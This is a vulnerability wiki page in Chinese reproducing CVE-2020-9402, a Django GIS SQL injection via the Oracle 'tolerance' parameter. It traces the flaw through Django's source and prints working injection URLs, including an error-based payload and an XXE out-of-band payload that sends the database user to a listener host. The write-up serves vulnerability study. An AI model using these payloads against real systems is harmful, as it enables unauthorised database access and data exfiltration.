<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Django/%EF%BC%88CVE-2020-9402%EF%BC%89Django%20Geo%20sql%E6%B3%A8%E5%85%A5/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2020-9402）Django Geo sql注入 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2020-9402\uff09Django Geo sql\u6ce8\u5165", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../CVE-2017-12794/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../CVE-2017-12794/" class="btn btn-xs btn-link">
        Django 500 Debug Page Cross-Site Scripting (XSS) (CVE-2017-12794)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2020-7471%EF%BC%89Django%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2020-7471%EF%BC%89Django%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-7471）Django sql注入漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2020-9402django-geo-sql">（CVE-2020-9402）Django Geo sql注入<a class="headerlink" href="#cve-2020-9402django-geo-sql" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Django
1.11.29之前的1.11.x版本、2.2.11之前的2.2.x版本和3.0.4之前的3.0.x版本中存在SQL注入漏洞。攻击者可借助特制的SQL语句利用该漏洞查看、添加、修改或删除数据库中的信息。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Django
1.11.29之前的1.11.x版本、2.2.11之前的2.2.x版本和3.0.4之前的3.0.x版本中存在SQL注入漏洞</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>根据官网的修复https://github.com/django/django/commit/6695d29b1c1ce979725816295a26ecc64ae0e927#diff-229e38ececbfc591f7a5e595bf5707c4，可以看到问题出在GIS的查询上面</p>
<p><img alt="" src="../resource/%28CVE-2020-9402%29DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId24.png" /></p>
<p><img alt="" src="../resource/%28CVE-2020-9402%29DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId25.png" /></p>
<p>官方只修复了这两个位置，可以发现基本上是对于<code>tolerance</code>参数进行判断是否为数字。那首先来了解一下GIS查询。</p>
<p>GIS查询API是一个地理位置的查询API，提供用户存储精确GPS的位置的数据模块，属于一个空间数据库，我们可以通过如下的经纬度信息</p>
<div class="codehilite"><pre><span></span><code>pnt = GEOSGeometry(&#39;POINT(-96.876369 29.905320)&#39;, srid=4326)

&gt;&gt;&gt;SRID=4326;POINT (-96.876369 29.90532)
</code></pre></div>

<p>来获得一个具体的定位信息,通过如下的模块来构建一个基本的地理信息存储</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">django.contrib.gis.db</span><span class="w"> </span><span class="kn">import</span> <span class="n">models</span>
<span class="k">class</span><span class="w"> </span><span class="nc">Names</span><span class="p">(</span><span class="n">models</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">CharField</span><span class="p">(</span><span class="n">max_length</span><span class="o">=</span><span class="mi">128</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__str__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">name</span>

<span class="k">class</span><span class="w"> </span><span class="nc">Interstate</span><span class="p">(</span><span class="n">Names</span><span class="p">):</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">LineStringField</span><span class="p">()</span>
</code></pre></div>

<p>后台存储的时候发出path的信息为json数据，例如</p>
<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="s">&quot;type&quot;</span><span class="p">:</span><span class="s">&quot;LineString&quot;</span><span class="p">,</span><span class="s">&quot;coordinates&quot;</span><span class="p">:[[</span><span class="o">-</span><span class="m m-Double">8167.236601807093</span><span class="p">,</span><span class="o">-</span><span class="m m-Double">3286.248045708844</span><span class="p">],[</span><span class="o">-</span><span class="m m-Double">7896.285624495958</span><span class="p">,</span><span class="o">-</span><span class="m m-Double">3324.9553281818644</span><span class="p">],[</span><span class="m m-Double">1083.8039092445451</span><span class="p">,</span><span class="o">-</span><span class="m m-Double">654.1528375435246</span><span class="p">]]}</span>
</code></pre></div>

<p><img alt="" src="../resource/%28CVE-2020-9402%29DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId26.png" /></p>
<p>我们就获得了一个基本的地理位置数据,同理，通过构造一个聚合的查询方法</p>
<div class="codehilite"><pre><span></span><code>def vuln(request):
    q = request.GET.get(&#39;q&#39;)
    qs=Interstate.objects.annotate(
            d=Distance(
                Point(-0.0733675346842369, -0.0295208671625432, srid=4326),
                Point(0.009735976166628611, -0.00587635491086091, srid=4326),
                tolerance = q, # default 0.05
            ),
        ).filter(d=D(m=1)).values(&#39;name&#39;)
</code></pre></div>

<p>因为官网文档找不到如何构造Point查询，因此为了省事，直接写死了Point数值。。srid为空间参考的投影设置，默认值为4326。其中<code>tolerance</code>是对于oracle特殊存在的一个键值，其作用是基本你的容错率，详细的信息可以参考<a href="https://docs.oracle.com/en/database/oracle/oracle-database/18/spatl/spatial-concepts.html#GUID-CE10AB14-D5EA-43BA-A647-DAC9EEF41EE6">oracle官方文档</a>。对应的查询语句为</p>
<div class="codehilite"><pre><span></span><code>SELECT &quot;APP_NAMEDMODEL&quot;.&quot;NAME&quot; FROM &quot;APP_INTERSTATE&quot; INNER JOIN &quot;APP_NAMEDMODEL&quot; ON (&quot;APP_INTERSTATE&quot;.&quot;NAMEDMODEL_PTR_ID&quot; = &quot;APP_NAMEDMODEL&quot;.&quot;ID&quot;) WHERE SDO_GEOM.SDO_DISTANCE(SDO_GEOMETRY(POINT (-0.0733675346842369 -0.0295208671625432),4326), SDO_GEOMETRY(POINT (0.009735976166628611 -0.00587635491086091),4326), 0.05) =  1.0 FETCH FIRST 21 ROWS ONLY;
</code></pre></div>

<p>**0x02代码分析**首先从传入一个url</p>
<div class="codehilite"><pre><span></span><code>http://127.0.0.1:8000/vuln/?q=20) = 1 OR 1=1 OR (1%2B1
</code></pre></div>

<p>从<code>annotate</code>聚合函数开始跟进，同普通的model函数查询一样，gis查询虽然拥有着单独的model模块，但依旧还是依靠着普通model中进行过滤和查询。从gis的model文件夹中的<code>__init__.py</code>文件中看</p>
<p><img alt="" src="../resource/%28CVE-2020-9402%29DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId28.png" /></p>
<p>主要的查询依然调用的是django最基本的db方法，而其中单独定义了<code>function</code>方法等一些对地理位置插叙独特的方法。程序运行到<code>/django/db/models/manager.py</code>文件中的<code>_get_queryset_methods</code>后，获取到tolerant参数之后便直接进入到gis模块中进行查询</p>
<p><img alt="" src="../resource/%28CVE-2020-9402%29DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId29.png" /></p>
<p>继而进入到<code>django/contrib/gis/measure.py</code>文件中的<code>MeasureBase</code>类中进行方法调用，那么后面的方法分析可以跳过，因此直接来到漏洞代码段。先来看gis
API中的functions函数，在as_oracle方法这一段</p>
<div class="codehilite"><pre><span></span><code>def as_oracle(self, compiler, connection, **extra_context):
    tol = self.extra.get(&#39;tolerance&#39;, self.tolerance)
    return self.as_sql(
        compiler, connection,
        template=&quot;%%(function)s(%%(expressions)s, %s)&quot; % tol,
        **extra_context
    )
</code></pre></div>

<p><code>tolerance</code>
从self.extra.get导入，该方法会搜索全局变量的值，如果该值不存在，则直接设置为0.05，并且将其直接传入到新的变量中。之后则不对tol进行任何处理直接拼接到template字符串中并且传入<code>as_sql</code>方法。那么官方对于as_sql的文档是，此方法需要一个SQLCompiler对象，位于<code>django/db/models/sql/compiler.py</code>文件中。而我们只需要知道在该对象中有一个<code>compile()</code>方法，该方法可以返回一个包含SQL字符串的元祖，而SQLComiler对象中的query变量则是存储直接进行SQL查询语句的SQL命令。从而两个Point分别进入<code>compile</code>方法中进行拼接</p>
<p><img alt="" src="../resource/%28CVE-2020-9402%29DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId30.png" /></p>
<p>不知道为什么，用pycharm在as_oracle下断点的时候，第一次到达SQLCompiler的时候，pycharm不会在as_oracle函数中停下来，而是在第二次查询的时候才会停，但是经过测试确实是在进入SQLCompiler之前调用过as_orcle函数，可能是pycharm没有正确识别重载函数吧。之后template构造模版也因此进入到<code>expression.py</code>中的as_sql函数中进行字符串构造</p>
<p><img alt="" src="../resource/%28CVE-2020-9402%29DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId31.png" /></p>
<p>因此最后进入oracle的命令语句是</p>
<div class="codehilite"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="s2">&quot;APP_NAMEDMODEL&quot;</span><span class="p">.</span><span class="s2">&quot;NAME&quot;</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="s2">&quot;APP_INTERSTATE&quot;</span><span class="w"> </span><span class="k">INNER</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="s2">&quot;APP_NAMEDMODEL&quot;</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="p">(</span><span class="s2">&quot;APP_INTERSTATE&quot;</span><span class="p">.</span><span class="s2">&quot;NAMEDMODEL_PTR_ID&quot;</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="s2">&quot;APP_NAMEDMODEL&quot;</span><span class="p">.</span><span class="s2">&quot;ID&quot;</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">SDO_GEOM</span><span class="p">.</span><span class="n">SDO_DISTANCE</span><span class="p">(</span><span class="n">SDO_GEOMETRY</span><span class="p">(</span><span class="n">POINT</span><span class="w"> </span><span class="p">(</span><span class="err">-</span><span class="mf">0.0733675346842369</span><span class="w"> </span><span class="err">-</span><span class="mf">0.0295208671625432</span><span class="p">),</span><span class="mi">4326</span><span class="p">),</span><span class="w"> </span><span class="n">SDO_GEOMETRY</span><span class="p">(</span><span class="n">POINT</span><span class="w"> </span><span class="p">(</span><span class="mf">0.009735976166628611</span><span class="w"> </span><span class="err">-</span><span class="mf">0.00587635491086091</span><span class="p">),</span><span class="mi">4326</span><span class="p">),</span><span class="w"> </span><span class="mf">0.05</span><span class="p">)</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w">  </span><span class="k">OR</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="mf">1.0</span><span class="w"> </span><span class="k">FETCH</span><span class="w"> </span><span class="k">FIRST</span><span class="w"> </span><span class="mi">21</span><span class="w"> </span><span class="k">ROWS</span><span class="w"> </span><span class="k">ONLY</span><span class="p">;</span>
</code></pre></div>

<p><img alt="" src="../resource/%28CVE-2020-9402%29DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId32.png" /></p>
<p>带入数据库中查询</p>
<p><img alt="" src="../resource/%28CVE-2020-9402%29DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId33.png" /></p>
<p><img alt="" src="../resource/%28CVE-2020-9402%29DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId34.png" /></p>
<p>官方修复的方法就是加入Value函数，判断传入的值是否为数字，否的话直接报错推出。那么第二个注入点就是<code>Union</code>了，建立Model</p>
<div class="codehilite"><pre><span></span><code><span class="k">class</span> <span class="n">City</span>(<span class="n">Names</span>):
    <span class="n">point</span> = <span class="n">models</span>.<span class="n">PointField</span>()  <span class="c1"># 点模块</span>
</code></pre></div>

<p>编辑传入的参数为</p>
<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="s">&quot;type&quot;</span><span class="p">:</span><span class="s">&quot;Point&quot;</span><span class="p">,</span><span class="s">&quot;coordinates&quot;</span><span class="p">:[</span><span class="m m-Double">13250.226757682816</span><span class="p">,</span><span class="m m-Double">68815.69380603009</span><span class="p">]}</span>
</code></pre></div>

<p>view中设置查询</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">django.contrib.gis.db.models</span><span class="w"> </span><span class="kn">import</span> <span class="n">Union</span>
<span class="k">def</span><span class="w"> </span><span class="nf">vuln2</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
    <span class="n">q</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">City</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="n">aggregate</span><span class="p">(</span>
            <span class="n">Union</span><span class="p">(</span><span class="s1">&#39;point&#39;</span><span class="p">,</span> <span class="n">tolerance</span><span class="o">=</span><span class="n">q</span><span class="p">),</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</code></pre></div>

<p>输入url</p>
<div class="codehilite"><pre><span></span><code>http://127.0.0.1:8000/vuln2?q=0.05)))%2C%20(((1
</code></pre></div>

<p>首先看结果，得到的SQL查询语句为</p>
<div class="codehilite"><pre><span></span><code>SELECT SDO_UTIL.TO_WKBGEOMETRY(SDO_AGGR_UNION(SDOAGGRTYPE(&quot;APP_CITY&quot;.&quot;POINT&quot;,0.05))), (((1))) AS &quot;POINT__UNION&quot; FROM &quot;APP_CITY&quot;;
</code></pre></div>

<p><img alt="" src="../resource/%28CVE-2020-9402%29DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId35.png" /></p>
<p>该aggregate查询方法是GIS查询特定的一种查询方法，为的是与地理查询的语句做适配,用法跟原模块的方法类似。因此跟进GIS模块中的聚合查询方法，位于<code>django/contrib/gis/db/models/aggregates.py</code>文件内的as_oracle方法。</p>
<p><img alt="" src="../resource/%28CVE-2020-9402%29DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId36.png" /></p>
<p>同样tolerance没有做任何检查直接传入了template模版语句中，原理与上面annotate查询过程一致。利用有大致两个方法报错注入</p>
<div class="codehilite"><pre><span></span><code><span class="nx">http</span><span class="p">:</span><span class="c1">//localhost:8000/test/?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v%24instance)) from dual) is null%20 OR (1%2B1</span>
</code></pre></div>

<p><img alt="" src="../resource/%28CVE-2020-9402%29DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId37.png" /></p>
<p>CVE-2014-6577因为Django自2.0以后支持的oracle版本为12以上，因此可以尝试oracle
XXE来进行SQL的注入。同时因为在SQL处理的过程中有三次利用%的模版跳转，因此需要在XMLpayload中的%替换为%%%%，payload为</p>
<div class="codehilite"><pre><span></span><code><span class="nx">http</span><span class="p">:</span><span class="c1">//localhost:8000/test/?q=20) = 1 OR (select%20extractvalue(xmltype(&#39;%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%25%25%25%20remote%20SYSTEM%20%22http%3A%2F%2Fdocker.for.mac.host.internal%3A9000%2F&#39;%7C%7C(SELECT%20user%20from%20dual)%7C%7C&#39;%22%3E%20%25%25%25%25remote%3B%5D%3E&#39;)%2C&#39;%2Fl&#39;)%20from%20dual)%20is%20not%20null OR (1%2B1</span>
</code></pre></div>

<p><img alt="" src="../resource/%28CVE-2020-9402%29DjangoGeosql%E6%B3%A8%E5%85%A5/media/rId38.png" /></p>
<p>命令执的话因为是docker起的oracle所以没有设置JAVA的环境，暂时也不能判定有没有，以后再研究看看。</p>
<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://xz.aliyun.com/t/7403">https://xz.aliyun.com/t/7403</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../CVE-2017-12794/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../CVE-2017-12794/" class="btn btn-xs btn-link">
        Django 500 Debug Page Cross-Site Scripting (XSS) (CVE-2017-12794)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2020-7471%EF%BC%89Django%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2020-7471%EF%BC%89Django%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-7471）Django sql注入漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>